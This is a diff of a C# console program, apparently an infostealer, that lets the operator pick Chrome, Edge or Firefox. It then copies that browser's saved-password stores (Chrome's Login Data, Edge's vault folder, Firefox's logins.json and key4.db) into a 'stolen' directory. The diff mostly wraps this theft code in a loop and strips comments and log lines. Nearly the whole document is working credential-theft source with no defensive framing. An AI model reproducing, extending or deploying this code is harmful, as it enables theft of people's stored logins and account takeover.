@@ -17,14 +17,11 @@ void CopyAll(DirectoryInfo source, DirectoryInfo target)
 {
     Directory.CreateDirectory(target.FullName);
 
-    // Copy each file into the new directory.
     foreach (FileInfo fi in source.GetFiles())
     {
-        Console.WriteLine(@"Copying {0}\{1}", target.FullName, fi.Name);
         fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
     }
 
-    // Copy each subdirectory using recursion.
     foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
     {
         DirectoryInfo nextTargetSubDir =
@@ -33,62 +30,65 @@ void CopyAll(DirectoryInfo source, DirectoryInfo target)
     }
 }
 
-Console.WriteLine("1.) Chrome");
-Console.WriteLine("2.) Edge");
-Console.WriteLine("3.) Firefox");
-
-Console.Write("Type option: ");
-string d = Console.ReadLine();
-
-while (!Int32.TryParse(d, out option))
+while (true)
 {
-    Environment.Exit(0);
-}
+    Console.Clear();
 
-option = Convert.ToInt32(d);
+    Console.WriteLine("1.) Chrome");
+    Console.WriteLine("2.) Edge");
+    Console.WriteLine("3.) Firefox");
 
-switch (option)
-{
-    case 1:
-        Console.WriteLine("Overtaking Chrome browser...");
+    Console.Write("Type option: ");
+    string d = Console.ReadLine();
 
-        string fileToCopychrome = (@"C:\Users\" + user + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data");
-        string destinationDirectorychrome = (apppath + "/stolen/LoginData-Chrome-" + thisDay.Ticks + user);
-        File.Copy(fileToCopychrome, destinationDirectorychrome);
-
-        break;
-    case 2:
-        Console.WriteLine("Overtaking Edge browser...");
-
-        string sourceDirectory = (@"C:\Users\" + user + @"\AppData\Local\Microsoft\vault");
-        string targetDirectory = (apppath + "/stolen/Vault-Edge-" + thisDay.Ticks + user);
-
-        Copy(sourceDirectory, targetDirectory);
-
-        break;
-
-    case 3:
-        Console.WriteLine("Overtaking Firefox browser...");
-
-        foreach (string fileLogin in Directory.EnumerateFiles((@"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\"), "logins.json", SearchOption.AllDirectories))
-        {
-            Console.WriteLine(fileLogin);
-            string fileToCopyfirefox = (fileLogin);
-            string destinationDirectoryfirefox = (apppath + "/stolen/Loginjson-Firefox-" + thisDay.Ticks + user + ".json");
-            File.Copy(fileToCopyfirefox, destinationDirectoryfirefox);
-        }
-
-        foreach (string fileKey in Directory.EnumerateFiles((@"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\"), "key4.db", SearchOption.AllDirectories))
-        {
-            Console.WriteLine(fileKey);
-            string fileToCopyfirefox = (fileKey);
-            string destinationDirectoryfirefox = (apppath + "/stolen/Key4db-Firefox-" + thisDay.Ticks + user + ".db");
-            File.Copy(fileToCopyfirefox, destinationDirectoryfirefox);
-        }
-
-        break;
-
-    default:
+    while (!Int32.TryParse(d, out option))
+    {
         Environment.Exit(0);
-        break;
+    }
+
+    option = Convert.ToInt32(d);
+
+    switch (option)
+    {
+        case 1:
+            Console.WriteLine("Overtaking Chrome browser...");
+
+            string fileToCopychrome = (@"C:\Users\" + user + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data");
+            string destinationDirectorychrome = (apppath + "/stolen/LoginData-Chrome-" + thisDay.Ticks + user);
+            File.Copy(fileToCopychrome, destinationDirectorychrome);
+
+            break;
+        case 2:
+            Console.WriteLine("Overtaking Edge browser...");
+
+            string sourceDirectory = (@"C:\Users\" + user + @"\AppData\Local\Microsoft\vault");
+            string targetDirectory = (apppath + "/stolen/Vault-Edge-" + thisDay.Ticks + user);
+
+            Copy(sourceDirectory, targetDirectory);
+
+            break;
+
+        case 3:
+            Console.WriteLine("Overtaking Firefox browser...");
+
+            foreach (string fileLogin in Directory.EnumerateFiles((@"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\"), "logins.json", SearchOption.AllDirectories))
+            {
+                string fileToCopyfirefox = (fileLogin);
+                string destinationDirectoryfirefox = (apppath + "/stolen/Loginjson-Firefox-" + thisDay.Ticks + user + ".json");
+                File.Copy(fileToCopyfirefox, destinationDirectoryfirefox);
+            }
+
+            foreach (string fileKey in Directory.EnumerateFiles((@"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\"), "key4.db", SearchOption.AllDirectories))
+            {
+                string fileToCopyfirefox = (fileKey);
+                string destinationDirectoryfirefox = (apppath + "/stolen/Key4db-Firefox-" + thisDay.Ticks + user + ".db");
+                File.Copy(fileToCopyfirefox, destinationDirectoryfirefox);
+            }
+
+            break;
+
+        default:
+            Environment.Exit(0);
+            break;
+    }
 }
